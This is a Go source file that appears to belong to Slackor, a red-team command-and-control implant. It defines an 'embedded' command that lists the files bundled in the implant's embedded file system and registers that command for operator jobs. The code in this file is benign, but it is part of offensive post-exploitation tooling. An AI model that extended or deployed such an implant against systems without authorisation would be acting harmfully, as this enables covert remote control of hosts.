package common

import (
	"fmt"
	"os"

	"github.com/dustin/go-humanize"
	"github.com/pkg/errors"
	"github.com/rakyll/statik/fs"

	"github.com/Coalfire-Research/Slackor/pkg/command"

	// Loads the embedded file system
	_ "github.com/Coalfire-Research/Slackor/internal/statik"
)

// Embedded lists files in the embedded file system
type Embedded struct{}

// Name is the name of the command
func (e Embedded) Name() string {
	return "embedded"
}

// Run lists files in the embedded file system
func (e Embedded) Run(clientID string, jobID string, args []string) (string, error) {
	if len(args) > 1 {
		return "", errors.New("embedded takes at most 1 argument")
	}
	root := "/"
	if len(args) == 1 {
		root = args[0]
	}

	statikFS, err := fs.New()
	if err != nil {
		return "", errors.Wrap(err, "unable to access embedded file system")
	}
	var result string
	err = fs.Walk(statikFS, root, func(path string, f os.FileInfo, err error) error {
		if err != nil {
			// If we can't stat the file for some reason, don't prevent other results from being returned
			result = result + fmt.Sprintf("%-28v", "n/a") + "   <ERR>    " + fmt.Sprintf("%-9v", "n/a") + "     " + path + "\n"
			return nil
		}
		size := humanize.IBytes(uint64(f.Size()))
		timestamp := f.ModTime()
		ts := timestamp.Format("01/02/2006 3:04:05 PM MST")
		dir := "            "
		if f.IsDir() {
			dir = "   <DIR>    "
		}
		result = result + fmt.Sprintf("%-28v", ts) + dir + fmt.Sprintf("%-9v", size) + "     " + path + "\n"
		return nil
	})
	if err != nil {
		return "", errors.Wrap(err, "error walking embedded file system")
	}
	if result == "" {
		result = "No embedded files."
	}
	return result, nil
}

func init() {
	command.RegisterCommand(Embedded{})
}
